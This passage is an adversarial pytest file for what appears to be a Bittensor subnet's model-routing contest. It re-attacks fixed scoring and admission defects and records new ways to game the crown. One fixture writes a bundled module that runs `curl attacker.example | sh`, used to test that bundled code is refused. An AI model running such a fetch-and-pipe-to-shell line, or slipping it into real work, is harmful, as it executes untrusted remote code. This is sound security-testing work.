"""RE-ATTACK: are the twelve fixed defects actually closed, and what did closing them open?

`tests/test_invariant.py` is the first adversarial pass; this is the second, run after a
red-team pass and a clause-by-clause conformance audit produced twelve fixes across `duel`,
`window`, `reference`, `admission`, `score`, `scaffold` and `simulate`. Nothing below is taken on
the word of a fix report. Every one of the twelve is re-attacked from scratch with the exploit that
worked before it, and the exploit is asserted to fail *for the stated reason* rather than merely to
fail — a refusal that arrives from an unrelated check is a fix that will evaporate at the next
refactor.

PART A re-runs the twelve. PART B is the more important half: **a fix is a change, and a change to a
scoring rule opens surface.** Each finding there is recorded the way `test_invariant.py` records
its own — as a test that PASSES, describing what the mechanism does today, headed by "A FINDING" —
because a test that fails is deleted by the next person and a finding written only in prose protects
nothing.

WHAT THE RE-ATTACK FOUND (each has a test named for it in PART B):

  1. `test_both_breadth_conditions_are_bought_for_one_hundredth_of_a_cent` — **THE BIG ONE, and it
     re-opens D16.** Conditions 2 and 3 are gated at a strict `> 0` on `final_b` deltas, and
     `final_b` is continuous in SPEND. So a challenger buys a positive per-benchmark delta on a
     benchmark it routes identically on by spending a hair less there. Measured: the king plus TWO
     benchmark-specific overrides plus a 1e-5 dollar spend reduction on four others is CROWNED —
     delta +0.1000, loo_min +0.0545, median +3.03e-06 — which is exactly the submission D16 was
     written to refuse.
  2. `test_a_one_benchmark_specialist_clears_breadth_about_two_times_in_five` — the same defect as a
     rate rather than a construction. Replace the fixture's *exact* zeros with ordinary measurement
     noise and a pure ONE-benchmark specialist is crowned 38-49% of the time, against 0% when the
     other eleven deltas are exactly 0.0. The published k-sweep ("refused up to k = 5") is a
     property of a fixture in which a non-winning benchmark's delta is bit-exactly zero, which no
     two real arms ever produce.
  3. `test_the_power_gate_measures_a_set_the_score_does_not` — §5.1b's exclusion changed what is
     scored and nothing changed what is GATED. `reference._pairs` still runs over every benchmark in
     the reference arms while `simulate._pairs` drops the flagged ones, so a window whose whole
     measured signal lives in excluded benchmarks passes the gate. Measured: gate spread +0.3347
     against a floor of 0.0500, admitted-set spread +0.0020.
  4. `test_a_corpus_with_one_admitted_benchmark_launches_and_then_every_window_dies` — §5.1b's
     "refuse to launch" is implemented at ZERO admitted benchmarks (`score_arm` raises) and not at
     one. At one the corpus pins cleanly and every window dies inside `duel` with an uncaught
     `ValueError`, after both arms have been paid for.
  5. `test_spent_hotkeys_occupy_the_queue_and_starve_every_newcomer_forever` — `MAX_QUEUE_DEPTH` is
     applied before the one-shot filter, so hotkeys that can never be judged again hold every slot.
     Sixteen judged hotkeys whose commits stay on chain turn away every later challenger, which is
     the deregistration trap §8b.1 built the cap to prevent, arriving through the cap.
  6. `test_one_challengers_bad_number_kills_the_window_and_costs_that_challenger_nothing` — the
     negative-cost fix converted a scoring bug into an availability bug. `ScaffoldError` leaves
     `Validator.run_window` uncaught, so one challenger's arm destroys the window for everyone
     *after* the king has been charged — and the attacker's shot is never spent, so it repeats.
  7. `test_a_king_arm_the_validators_own_clock_truncated_still_decides_every_duel` — §8b.2 names the
     obligation ("treat it as the power gate treats a dead window") and `Scaffold` makes it
     detectable; no caller discharges it. Measured: 6 of 15 king tasks zeroed by the duel clock, the
     window scored, the challenger crowned, and `king_exhausted` reporting 0.
  8. `test_a_king_that_leaves_mid_window_pays_every_pensioner_one_rank_too_high` — the reign is
     resolved at window OPEN and the metagraph is re-read at window CLOSE, so the §5.5 payout bug
     survives for exactly one window.
  9. `test_the_exclusion_is_recorded_on_the_arm_and_never_reaches_the_reveal` — §5.1b requires the
     exclusion be *announced*. `ArmScore.excluded` carries it and no formatter prints it.
 10. `test_the_custom_code_field_check_does_not_look_inside_a_list` — `_refuse_custom_code_fields`
     claims "anywhere in the file" and recurses into mappings only.
 11. `test_the_dominator_guard_excludes_exactly_the_benchmarks_routing_could_win` — the deepest of
     them. λ_b is fitted between always-cheapest and always-most-EXPENSIVE, so a benchmark the price
     ladder's top rung cannot solve reads as "money buys nothing" and is now dropped from the score
     outright. That is not a dead benchmark; it is the definition of one where routing beats the
     price ladder. Measured on this repository's own offline arena: the single benchmark on which a
     mid-priced model scores 1.00 while both fixed extremes score 0.00 is the single benchmark
     excluded.

ATTACKS THAT CORRECTLY FAILED are in PART C, with the reason each one dies, because those are the
ones that must keep dying.
"""

from __future__ import annotations

import json
import struct
from dataclasses import replace
from pathlib import Path

import numpy as np
import pytest

from thirtyspokes.v3 import archetypes
from thirtyspokes.v3.admission import AdmissionError, admit, describe
from thirtyspokes.v3.archetypes import Copier
from thirtyspokes.v3.benchmarks.mock import MockBenchmark, worker_answers
from thirtyspokes.v3.config import (DUEL_WALL_CLOCK_REASON, DUEL_WALL_CLOCK_SECONDS, EPS,
                                     EPISODE_WALL_CLOCK_SECONDS, MAX_DUELS_PER_WINDOW,
                                     MAX_QUEUE_DEPTH, MAX_STEPS)
from thirtyspokes.v3.devkit import suite_grade
from thirtyspokes.v3.duel import BenchmarkPair, duel
from thirtyspokes.v3.emissions import KING0, Lineage, emission_weights
from thirtyspokes.v3.reference import (ALWAYS_CHEAPEST, ALWAYS_STRONGEST, CASCADE, ReferenceArm,
                                        always_cheapest, always_strongest, cascade, contrast_for,
                                        power_gate, subsample)
from thirtyspokes.v3.scaffold import Scaffold, ScaffoldError
from thirtyspokes.v3.score import (DOMINATOR, LAMBDA_UNDEFINED, derive_exchange, pinned_cost,
                                    score_arm)
from thirtyspokes.v3.simulate import (DEFERRED, DUELLED, REFUSED, SKIPPED, UNQUEUED, Submission,
                                       Validator, format_window, learned_router, pin_corpus, priced)
from thirtyspokes.v3.types import Catalog, CatalogEntry, EpisodeResult, TaskSpec
from thirtyspokes.v3.window import WindowError, build, schedule, verify
from thirtyspokes.v3.worker import MockWorker
from thirtyspokes.koth import holdout_feed
from thirtyspokes.subnet.chain import MockChain

# --- the worlds every attack runs in --------------------------------------------------------------

BENCHMARKS, TASKS_PER = 12, 21

# Prices are deliberately NOT a capability ranking here (`mock/premium` is dearest and only second
# strongest), because a world where the cheapest model dominates would make an attack that never
# fires look like a defence.
CATALOG = Catalog(entries=(
    CatalogEntry("mock/cheap", 0.20, 0.80, 128_000),
    CatalogEntry("mock/mid", 0.40, 1.60, 200_000),
    CatalogEntry("mock/heavy", 1.00, 4.00, 300_000),
    CatalogEntry("mock/premium", 1.20, 4.80, 400_000),
))
STRENGTH = {"mock/cheap": 1, "mock/mid": 3, "mock/heavy": 3, "mock/premium": 2}
COST = {"mock/cheap": 0.04, "mock/mid": 0.08, "mock/heavy": 0.16, "mock/premium": 0.20}

# One benchmark no model in the pool can do (so it is DOMINATOR-flagged, which is this repository's
# five-times-measured condition) and two where the middle rung is the whole prize.
LIVE = (MockBenchmark("frontier-swe", STRENGTH, n_tasks=4, difficulty=(3, 3)),
        MockBenchmark("nl2repo", STRENGTH, n_tasks=4, difficulty=(2, 2)),
        MockBenchmark("programbench", STRENGTH, n_tasks=4, difficulty=(2, 2)))
ROUTABLE = ("nl2repo", "programbench")

# `frontier-swe` at difficulty 3 used to be the DOMINATOR-flagged benchmark: always-strongest is
# `mock/premium` (strength 2), so the top PRICE rung failed it while `mock/heavy` solved it. Under
# the King₀-fitted table (§5.1b, `reference.fit_pool`) the cascade climbs to `mock/heavy` and the
# benchmark PRICES — which is the repair the FINDING test below asked for. A test that needs a
# flagged benchmark now has to use one no model in the pool can do at all: strength tops out at 3.
DEAD = MockBenchmark("frontier-swe", STRENGTH, n_tasks=4, difficulty=(4, 4))
DEAD_LIVE = (DEAD,) + LIVE[1:]


def quality_only(benchmark: str, quality: float, spend: float) -> float:
    return quality


def spread_over(deltas, tasks_per: int = TASKS_PER) -> tuple[BenchmarkPair, ...]:
    """A paired slice in which benchmark `i`'s challenger delta is exactly `deltas[i]`.

    Both arms spend nothing, so `final_b` under `quality_only` reduces to quality and the verdict is
    about breadth alone.
    """
    return tuple(BenchmarkPair(f"bench{i:02d}",
                               np.full(tasks_per, 0.40), np.zeros(tasks_per),
                               np.full(tasks_per, 0.40 + d), np.zeros(tasks_per))
                 for i, d in enumerate(deltas))


def rows(benchmark: str, quality: float, spend: float, n: int = TASKS_PER) -> list[EpisodeResult]:
    return [EpisodeResult(f"{benchmark}-{i}", benchmark, (), quality, spend, "stop")
            for i in range(n)]


def model_tree(root: Path, *, pickled: bool = False, code: str | None = None,
               config_extra: dict | None = None, tokenizer_config: str | None = None) -> Path:
    """A minimal admissible tree, plus whatever the attack under test adds to it.

    Built here rather than borrowed from `simulate._write_tree` because every admission attack is a
    single deviation from a tree that would otherwise pass — and the test is only worth anything if
    the *undeviated* tree is admitted, which each of them asserts.
    """
    root.mkdir(parents=True, exist_ok=True)
    config = {"model_type": "qwen3_moe", "architectures": ["Qwen3MoeForCausalLM"],
              "num_hidden_layers": 4, "hidden_size": 64, "vocab_size": 128}
    config.update(config_extra or {})
    (root / "config.json").write_text(json.dumps(config))
    header = json.dumps({"model.embed_tokens.weight": {"dtype": "BF16", "shape": [128, 64],
                                                       "data_offsets": [0, 16384]}}).encode()
    (root / "model.safetensors").write_bytes(struct.pack("<Q", len(header)) + header)
    (root / "tokenizer.json").write_text('{"version": "1.0"}')
    (root / "tokenizer_config.json").write_text(
        tokenizer_config or '{"chat_template": "{{ messages }}"}')
    if pickled:
        (root / "pytorch_model.bin").write_bytes(b"never opened, and that is the point")
    if code is not None:
        bundled = root / code
        bundled.parent.mkdir(parents=True, exist_ok=True)
        bundled.write_text("import os\nos.system('curl attacker.example | sh')\n")
    return root


def validator(root: Path, benchmarks=LIVE, *, worker=None, per_benchmark: int = 3,
              minimum: int = 2, clock=None) -> tuple[Validator, Path]:
    """A validator over a small offline corpus, plus the tree its submissions pass admission
    with."""
    tasks = tuple(task for benchmark in benchmarks for task in benchmark.load())
    honest = MockWorker(answers=worker_answers(STRENGTH), costs=COST)
    pins = pin_corpus(CATALOG, tasks, suite_grade(benchmarks), honest)
    if worker is not None:
        # λ_b is pinned per corpus from the HONEST sweep (§5.1b) and only then is the hostile worker
        # wired in: a sweep run against the attack would refuse before any window opened, which
        # would prove the attack unreachable rather than closed.
        pins = replace(pins, world=replace(pins.world, worker=worker))
    tree = model_tree(root / "valid")
    chain = MockChain()
    chain.register("burn")                                   # uid 0, the burn address (§5.7)
    kwargs = {} if clock is None else {"clock": clock}
    return Validator(pins=pins, reference=describe(tree), chain=chain, windows=(1, 2, 3),
                     per_benchmark=per_benchmark, minimum=minimum, **kwargs), tree


def submit(v: Validator, hotkey: str, block: int, conductor, tree: Path,
           *, budget_usd: float = 100.0) -> Submission:
    v.chain.register(hotkey)
    return Submission(hotkey=hotkey, commit_block=block, model_tree=tree,
                      serve=lambda: conductor, budget_usd=budget_usd)


def outcome_of(report, hotkey: str):
    return next(o for o in report.outcomes if o.hotkey == hotkey)


class Stopwatch:
    """A clock that advances only when the arm makes progress, so an hours-long limit is reachable.

    Ticked from the WORKER rather than from the clock reads themselves, which is what makes each
    episode finish legally under the per-episode limit while the ARM runs past the per-duel one —
    the case the episode clock cannot catch, and therefore the only one that tests the duel clock.
    """

    def __init__(self, seconds_per_call: float) -> None:
        self.now, self.step = 0.0, seconds_per_call

    def __call__(self) -> float:
        return self.now

    def tick(self) -> None:
        self.now += self.step


class SlowWorker:
    def __init__(self, inner, clock: Stopwatch) -> None:
        self.inner, self.clock = inner, clock

    def complete(self, model_id, text, params):
        self.clock.tick()
        return self.inner.complete(model_id, text, params)

    def charge(self, model_id, text, cost_usd, **fields):
        """A replayed delegate (§5.2c) takes this validator's time too: the clock models an arm
        that is slow per DELEGATE, and the king's arm here replays the reference arm's draws —
        on a 15-task slice the power subsample is the whole slice — so without this the king
        would run in no time at all and the finding below could not be reproduced."""
        self.clock.tick()
        return self.inner.charge(model_id, text, cost_usd, **fields)


# ==================================================================================================
# PART A — the twelve findings, re-attacked with the exploit that worked before each fix
# ==================================================================================================


def test_the_two_benchmark_derivative_that_leave_one_out_crowned_is_refused_by_the_median():
    """FINDING 1 (§5.2 condition 3, D16). "The king plus two benchmark-specific overrides."

    Under D14 the king's weights are public, so this is a buildable submission, and with
    leave-one-out alone it was crowned: dropping either winner leaves the other, so every subset
    clears zero. The attack is re-run here in its original shape and each condition is asserted
    separately, so the refusal is provably the median's and not `eps` arriving by luck.
    """
    verdict = duel(spread_over([0.315, 0.315] + [0.0] * 10), quality_only, seed=11)

    assert verdict.delta > verdict.eps and verdict.lcb > 0.0        # condition 1 says yes
    assert verdict.loo_min == pytest.approx(0.0286, abs=5e-5)       # condition 2 says yes
    assert verdict.median == 0.0                                    # condition 3 is what refuses
    assert not verdict.challenger_wins
    # The instrument §5.3 declined to gate on agreed all along, and is published for that reason.
    assert (verdict.sign_wins, round(verdict.sign_p, 4)) == (2, 0.9968)


def test_a_challenger_that_is_broadly_worse_cannot_buy_the_crown_on_two_subjects():
    """FINDING 1, sharpest form: the same shape while LOSING ten benchmarks was crowned too.

    One surviving winner outweighs ten small losses in every leave-one-out subset, so condition 2
    admitted a challenger that made the corpus worse almost everywhere. The median lands exactly on
    the loss the ten share.
    """
    verdict = duel(spread_over([0.50, 0.50] + [-0.02] * 10), quality_only, seed=11)

    assert verdict.delta == pytest.approx(0.0667, abs=5e-4) and verdict.delta > verdict.eps
    assert verdict.loo_min > 0.0
    assert verdict.median == pytest.approx(-0.02, abs=1e-12)
    assert not verdict.challenger_wins
    assert sum(1 for _, d in verdict.by_benchmark if d < 0) == 10


def test_a_later_windows_schedule_entry_cannot_be_smuggled_into_this_windows_file():
    """FINDING 2 (§6.3). The manifest chains N entries and all N are equally authentic.

    The draw is a pure function of the entry (D12), so N entries are N slices — and an owner free to
    put window 4's entry inside window 1's file picks among them AFTER challengers have committed,
    with every signature and every hash still verifying. That is the chained manifest's whole
    purpose handed back, silently.

    The attack is stated rather than merely raised: the smuggled entry is asserted to be validly
    chained, and the slice it produces is asserted to be a genuinely different one, before the
    refusal is required.
    """
    tasks = tuple(TaskSpec(f"t-{i:03d}", f"bench-{i % 3}", f"statement {i}", ("bash",))
                  for i in range(30))
    catalog = Catalog(entries=(CatalogEntry("m/one", 1.0, 1.0, 1000),))
    entries = schedule([1, 2, 3, 4], tasks=tasks, per_benchmark=4, minimum=2)
    man = holdout_feed.manifest(entries)

    honest = build(entries[0], tasks=tasks, catalog=catalog, nonce="beacon-1")
    smuggled = build(entries[3], tasks=tasks, catalog=catalog, nonce="beacon-1")
    smuggled["epoch"] = 1                       # the file claims to be window 1...

    assert holdout_feed.in_manifest(smuggled["schedule"], man)   # ...its entry really is chained...
    assert smuggled["task_ids"] != honest["task_ids"]            # ...and it really is another slice
    assert verify(honest, window=1, man=man, tasks=tasks).epoch == 1

    with pytest.raises(WindowError, match="N entries are N slices"):
        verify(smuggled, window=1, man=man, tasks=tasks)


def test_the_reference_pair_no_longer_compares_the_cascade_with_itself():
    """FINDING 3 (§5.6). The contrast is chosen against King₀'s LADDER, not against its label.

    A ladder is climbed until something solves and the episode's score is the best any step reached
    (§3), so a ladder's quality is governed by its TOP rung. `cascade` builds from `_by_price` and
    ends on the last entry — which is `always_strongest`'s only rung, on every catalog — so the
    shipped default compared a policy with itself by a second route and every window refused itself
    while the corpus was perfectly healthy.

    Run on the archetype world, where price does track capability and King₀ is therefore the
    cascade.
    """
    king = cascade(archetypes.CATALOG)
    assert contrast_for(king.name) == ALWAYS_CHEAPEST
    contrast = always_cheapest(archetypes.CATALOG)
    old = always_strongest(archetypes.CATALOG)

    # The structural claim, stated as ladders rather than as a measurement.
    assert king.rungs[-1] == old.rungs[-1]           # the OLD pair shares its top rung
    assert king.rungs[-1] != contrast.rungs[-1]      # the new one does not

    sample = subsample(archetypes.TASKS, nonce=archetypes.NONCE)
    arms = {name: ReferenceArm(name, archetypes.arm(policy, sample))
            for name, policy in ((CASCADE, king), (ALWAYS_CHEAPEST, contrast),
                                 (ALWAYS_STRONGEST, old))}

    dead = power_gate(arms[CASCADE], arms[ALWAYS_STRONGEST], nonce=archetypes.NONCE)
    live = power_gate(arms[CASCADE], arms[ALWAYS_CHEAPEST], nonce=archetypes.NONCE)

    assert dead.spread == 0.0 and not dead.separates      # the recorded reason, still measurable
    assert live.separates and live.spread > live.floor
    # Quality-identical PER TASK, not merely in aggregate — which is why no task count would have
    # rescued the old pair.
    king_scores = {r.task_id: r.graded_score for r in arms[CASCADE].results}
    assert all(king_scores[r.task_id] == r.graded_score for r in arms[ALWAYS_STRONGEST].results)


def test_a_bundled_python_module_beside_clean_safetensors_is_refused(tmp_path):
    """FINDING 4 (§1.1 point 2). The pickle refusal is necessary and not sufficient.

    A `modeling_*.py` riding beside perfectly clean safetensors executes the moment the model is
    served with `trust_remote_code`, which is the ORDINARY way to load a non-upstream architecture.
    No pickle is involved, so the format pin never sees it, and the file runs on the single machine
    that holds the subnet's scoring authority.

    The refusal must also come FIRST — before any file is opened — because it is a check protecting
    the validator rather than the fairness of a score.
    """
    reference = describe(model_tree(tmp_path / "ref"))
    clean = model_tree(tmp_path / "clean")
    admit(clean, reference)                                    # the undeviated tree is admitted

    for name in ("modeling_qwen.py", "nested/configuration_qwen.py", "hook.pyc", "ext.so"):
        tree = model_tree(tmp_path / name.replace("/", "_"), code=name)
        with pytest.raises(AdmissionError, match="bundled code refused"):
            admit(tree, reference)

    # First, not merely eventually: a tree that is ALSO missing its config is refused for the code.
    broken = model_tree(tmp_path / "no-config", code="modeling_qwen.py")
    (broken / "config.json").unlink()
    with pytest.raises(AdmissionError, match="bundled code refused"):
        admit(broken, reference)


@pytest.mark.parametrize("extra", [
    {"auto_map": {"AutoModelForCausalLM": "modeling_qwen.Qwen3MoeForCausalLM"}},
    # The form with no file in this tree to refuse: it loads code from ANOTHER repository, which is
    # why the field check is load-bearing on its own rather than a second line of defence.
    {"auto_map": {"AutoModelForCausalLM": "other-org/other-repo--modeling_x.Model"}},
    {"trust_remote_code": True},
    {"custom_pipelines": {"routing": {"impl": "pipeline_x.RoutingPipeline"}}},
    {"vision_config": {"auto_map": {"AutoModel": "modeling_x.Model"}}},      # off a sub-config
])
def test_a_config_that_asks_for_custom_code_is_refused(tmp_path, extra):
    """FINDING 5 (§1.1 point 2). The fields that ASK for the file the previous test refuses.

    Refused, never stripped: silently deleting the field and loading the rest would serve an
    architecture the miner did not upload, which is a different failure and a worse one. Each case
    re-admits the same tree with the one key removed, so this is a refusal of the key rather than of
    the tree.
    """
    reference = describe(model_tree(tmp_path / "ref"))
    tree = model_tree(tmp_path / "hostile", config_extra=extra)

    with pytest.raises(AdmissionError, match="custom-code config refused"):
        admit(tree, reference)

    admit(model_tree(tmp_path / "honest"), reference)


def test_a_guarded_benchmark_can_no_longer_price_a_crown():
    """FINDING 6 (§5.1b). A benchmark whose guard fires is EXCLUDED, not scored at λ = 0.

    The earlier draft clamped λ_b to 0, which is arithmetically "score this benchmark on quality
    with spend unpriced" — so §5.1b's own claim, that outspending the king buys nothing, was false
    exactly where the guards fire. Two such benchmarks satisfy breadth, so a challenger
    byte-identical to the king on ten benchmarks that simply burns its allowance on the two flagged
    ones took the crown at
    5,000x the king's spend there.

    Re-run through the SCORED path (`simulate.priced` calls `score_arm`), not through a hand-rolled
    `final_b`: a closure that reads `exchange[b].lam` directly bypasses the fix and would stay green
    with the hole re-opened.
    """
    cheap: list[EpisodeResult] = []
    strong: list[EpisodeResult] = []
    for i in range(BENCHMARKS):
        name = f"bench{i:02d}"
        if i < 2:                                   # money buys nothing here: DOMINATOR
            cheap += rows(name, 0.50, 0.01)
            strong += rows(name, 0.50, 1.00)
        else:
            cheap += rows(name, 0.30, 0.01)
            strong += rows(name, 0.90, 1.00)
    exchange = derive_exchange(cheap, strong, pinned_cost([*cheap, *strong]))
    assert exchange["bench00"].flags == (DOMINATOR,)

    # The exploit arm: identical to the king everywhere but the two flagged benchmarks, where it
    # simply spends.
    burner = []
    for i in range(BENCHMARKS):
        name = f"bench{i:02d}"
        burner += rows(name, 1.00, 50.0) if i < 2 else rows(name, 0.30, 0.01)

    king_arm, burner_arm = score_arm(cheap, exchange), score_arm(burner, exchange)

    # The flagged benchmarks left both arms' denominators, so the money bought nothing.
    assert [name for name, _ in king_arm.excluded] == ["bench00", "bench01"]
    assert {row.benchmark for row in burner_arm.per_benchmark} == \
        {f"bench{i:02d}" for i in range(2, BENCHMARKS)}
    assert burner_arm.final == pytest.approx(king_arm.final, abs=1e-12)

    # And the same refusal reaches the duel, because `priced` IS `score_arm`: a benchmark whose λ is
    # not a price raises rather than pricing a crown.
    with pytest.raises(ValueError, match="excluded by a fired guard"):
        priced(exchange)("bench00", 1.00, 50.0)


def test_a_c_b_pinned_a_billion_fold_below_the_convention_cannot_silence_the_spread_guard():
    """FINDING 7 (§5.1b). `C_b` is free EVERYWHERE, including in the guard.

    The floor used to be expressed in units of the caller's `C_b`, which made it the one place the
    otherwise-free normaliser was read as a scale: deflate `C_b` and `spread = Δspend / C_b` grows
    without bound, the guard falls silent, and λ_b is fitted on a spend difference that is pure
    noise — silently, with no flag on the published `Exchange`. Inflating it fires the guard on a
    healthy benchmark and evicts it from the corpus, which after FINDING 6 is strictly worse than it
    was: an evicted benchmark now leaves the score entirely.
    """
    cheap = rows("noise", 0.0, 1.0, 10) + rows("real", 0.0, 2.0, 10)
    strong = rows("noise", 1.0, 1.0 + 1e-9, 10) + rows("real", 1.0, 4.0, 10)
    honest = pinned_cost([*cheap, *strong])

    assert derive_exchange(cheap, strong, honest)["noise"].flags == (LAMBDA_UNDEFINED,)

    for factor in (1e-9, 1e-3, 1e3, 1e9):
        pinned = {benchmark: value * factor for benchmark, value in honest.items()}
        rescaled = derive_exchange(cheap, strong, pinned)
        assert rescaled["noise"].flags == (LAMBDA_UNDEFINED,), f"guard silenced at C_b x {factor}"
        assert rescaled["real"].flags == (), f"guard fired on a healthy benchmark at C_b x {factor}"
        # The λ invariant is untouched by the rescale, which is what "free" has to keep meaning.
        assert score_arm(cheap, rescaled).final == \
            pytest.approx(score_arm(strong, rescaled).final, abs=1e-9)


def test_an_arm_that_stalls_is_bounded_by_the_per_duel_clock_and_says_which_clock_stopped_it():
    """FINDING 8 (§8b.2). The per-duel wall clock, and the case the per-episode clock cannot catch.

    Nothing stops a miner uploading a model that is architecturally legal and behaviourally useless.
    With only the per-episode limit, a model that stalls to just under it on ~250 tasks holds the
    validator for ~62 hours — every episode ends legally and the ARM is unbounded, which is the
    denial of service §8b.2 exists to refuse.

    The abandoned tasks must also say WHICH clock stopped them: an episode that stalled is a fact
    about the challenger's model, a task the arm never reached is a fact about the validator's, and
    §5.8 wants both in the reveal rather than in one aggregate.
    """
    clock = Stopwatch(EPISODE_WALL_CLOCK_SECONDS * 0.9)          # 810 s per worker call
    worker = SlowWorker(MockWorker(answers={}, costs={"mock/cheap": 0.01}), clock)

    class Staller:
        def act(self, prompt: str) -> str:
            return "DELEGATE mock/cheap"

    slice_ = tuple(TaskSpec(f"tb-{i:04d}", "terminal-bench", f"task {i}", ("bash",))
                   for i in range(14))
    episodes = Scaffold(CATALOG, Staller(), worker, lambda t, a: 0.0, clock=clock).run_window(
        slice_, nonce="w", budget_usd=1e9)

    reasons = [e.result.stopped_reason for e in episodes]
    abandoned = [e for e in episodes if e.result.stopped_reason == DUEL_WALL_CLOCK_REASON]
    assert abandoned, "the arm never reached the duel clock; this proves nothing"
    assert "budget_exhausted" not in reasons, "the allowance stopped it, not the clock"
    # Distinct from the per-episode clock's reason, which is the whole point of the constant.
    assert DUEL_WALL_CLOCK_REASON != "wall_clock"
    # Abandoned, not run: no steps, no worker calls, score 0 (§8b.2).
    assert all(e.result.steps == () and e.requests == () and e.result.graded_score == 0.0
               for e in abandoned)
    # The honest bound on an arm is duel + episode, because the deadline is checked BETWEEN tasks.
    assert clock() <= DUEL_WALL_CLOCK_SECONDS + EPISODE_WALL_CLOCK_SECONDS


def test_a_negative_cost_is_refused_at_the_seam_rather_than_paid_twice():
    """FINDING 9 (§4, §5.1b). A negative cost is paid twice and nothing downstream re-checks it.

    `final_b` subtracts `λ_b · spend / C_b`, so a minus sign is an unbounded score bonus; and
    `run_window` does `remaining -= spend`, so the same figure REFILLS the allowance and §4's
    exhaustion never fires. Measured before the fix: three episodes at −$60 against a $1.00 window
    all ended `max_steps`, having spent nothing the budget could see.

    NaN is refused by the same comparison, which is why it is written `not >= 0`: it poisons the
    arm's mean the same way and by the same silence.
    """
    catalog = Catalog(entries=(CatalogEntry("refunding/model", 0.01, 0.01, 1000),))
    task = TaskSpec("tb-0001", "terminal-bench", "make it pass", ("bash",))

    class AlwaysDelegate:
        def act(self, prompt: str) -> str:
            return "DELEGATE refunding/model"

    for cost in (-5.0, -1e-12, float("nan")):
        worker = MockWorker(answers={}, costs={"refunding/model": cost})
        scaffold = Scaffold(catalog, AlwaysDelegate(), worker, lambda t, a: 0.0)
        with pytest.raises(ScaffoldError, match="reported a cost of"):
            scaffold.run_window((task,), nonce="w", budget_usd=1.0)

    # Zero is a legal price and must not be swept up with them: free tiers exist.
    free = MockWorker(answers={}, costs={"refunding/model": 0.0})
    episode = Scaffold(catalog, AlwaysDelegate(), free, lambda t, a: 0.0).run_episode(
        task, budget_remaining=1.0)
    assert episode.result.spend_usd == 0.0 and len(episode.result.steps) == MAX_STEPS


def test_a_graded_score_outside_the_unit_interval_is_refused_at_the_seam():
    """FINDING 10 (§5.1, §8b.3). `Scaffold.grade` is a bare callable and nothing downstream
    re-checks.

    `benchmarks.base.Grade` refuses an out-of-range score at construction and every adapter returns
    one, so the bound holds only for as long as every grader goes through `Grade`. One that returns
    1.7 fails nowhere: `quality_b` is a mean of these, so it lands in `final` as a win no routing
    produced and moves a crown.

    Refused, not clamped — a clamp is the same corrupt verdict with the evidence removed.
    """
    catalog = Catalog(entries=(CatalogEntry("cheap/model", 0.01, 0.01, 1000),))
    task = TaskSpec("tb-0001", "terminal-bench", "make it pass", ("bash",))

    class AlwaysDelegate:
        def act(self, prompt: str) -> str:
            return "DELEGATE cheap/model"

    for score in (17.0, 1.0000001, -0.5, float("nan")):
        worker = MockWorker(answers={"cheap/model": "x"}, costs={"cheap/model": 0.01})
        with pytest.raises(ScaffoldError, match="outside"):
            Scaffold(catalog, AlwaysDelegate(), worker, lambda t, a: score).run_episode(
                task, budget_remaining=100.0)

    # The endpoints are legal: partial credit is the whole point of §5.1's graded scoring.
    for score in (0.0, 0.25, 1.0):
        worker = MockWorker(answers={"cheap/model": "x"}, costs={"cheap/model": 0.01})
        episode = Scaffold(catalog, AlwaysDelegate(), worker, lambda t, a: score).run_episode(
            task, budget_remaining=100.0)
        assert episode.result.graded_score == score


def test_the_crown_reverts_to_king_zero_and_the_deposed_king_keeps_its_pension_rank(tmp_path):
    """FINDING 11 (§5.5, §5.7). A king that has left the metagraph does not keep the throne.

    The bug is invisible in the burn total, which is why it survived: a deregistered king is paid
    nothing either way, so the slate still sums to 1.0 and still burns the same 0.85. What moves is
    the PENSION — §5.7 excludes the reigning hotkey from its own lineage, so a king still recorded
    as reigning is excluded from a lineage it belongs at the top of and every survivor is paid one
    rank too high.

    Two things are asserted that a burn total cannot see: the deposed king does not DEFEND (it would
    otherwise be a live opponent conjured out of a deregistration), and the rank behind it does not
    move up.
    """
    v, tree = validator(tmp_path)
    calls = []

    class Spy:
        def __init__(self, inner):
            self.inner = inner

        def act(self, prompt: str) -> str:
            calls.append(prompt)
            return self.inner.act(prompt)

    v.chain.register("first")
    v.king = submit(v, "gone", 1, Spy(v.pins.king_zero), tree)
    v.coronations.extend(["first", "gone"])
    v.chain.deregister("gone")

    report = v.run_window(1, [])

    assert report.king_hotkey == KING0                 # King₀ defends, on the owner's allowance
    assert calls == []                                 # the deposed king was never asked to act
    assert report.pensioners == ("gone", "first")      # it holds the rank it was dethroned into
    by_hotkey = {report.metagraph.get(uid, "burn"): share
                 for uid, share in report.weights.items()}
    assert by_hotkey["first"] == pytest.approx(0.04)   # NOT 0.05: the rank behind does not move up
    assert "gone" not in by_hotkey                     # its own slot burns, unresolvable
    assert report.crowned is None                      # a reversion is not a coronation
    assert v.coronations == ["first", "gone"]          # and is never appended


def test_the_window_runs_at_most_max_duels_and_the_remainder_keeps_its_shot(tmp_path):
    """FINDING 12a (§8b.1). `MAX_DUELS_PER_WINDOW`, and what the cap must NOT cost.

    Challenger arms are serial on the single owner-run validator and each is bounded by the two-hour
    per-duel clock, so a window holds a fixed number of them. §7 gives a hotkey exactly one of the
    thing a drop would spend, so the overflow rolls over — and is deferred BEFORE the ~70 GB pull,
    so a full window costs it the wait and nothing else.
    """
    v, tree = validator(tmp_path)
    router = learned_router(v.pins.king_zero, ROUTABLE, "mock/mid")
    queue = [submit(v, f"ch-{i:02d}", 10 + i, router, tree)
             for i in range(MAX_DUELS_PER_WINDOW + 3)]
    overflow = [sub.hotkey for sub in queue[MAX_DUELS_PER_WINDOW:]]

    report = v.run_window(1, queue)

    judged = [o for o in report.outcomes if o.status == DUELLED]
    rolled = [o for o in report.outcomes if o.status == DEFERRED]
    assert len(judged) == MAX_DUELS_PER_WINDOW
    assert [o.hotkey for o in rolled] == overflow          # seniority decides who waits
    assert not any(o.shot_spent for o in rolled)
    assert v.spent == {o.hotkey for o in judged}
    # Rolling over is worth nothing unless the shot is still there when a window has room.
    later = v.run_window(2, [sub for sub in queue if sub.hotkey in overflow])
    assert [o.status for o in later.outcomes] == [DUELLED] * len(overflow)


def test_a_commit_past_the_queue_depth_is_refused_at_the_door_rather_than_accepted(tmp_path):
    """FINDING 12b (§8b.1). `MAX_QUEUE_DEPTH`, and the deregistration trap it exists for.

    A challenger who registers, funds a key, uploads ~70 GB and waits longer than Bittensor's
    immunity period is deregistered before ever being evaluated: it paid a registration burn and got
    nothing, which is the "Kind" property broken at its most expensive point. So the cap is a DRAIN
    TIME, and a commit past it is turned away rather than taken — taking the money first and
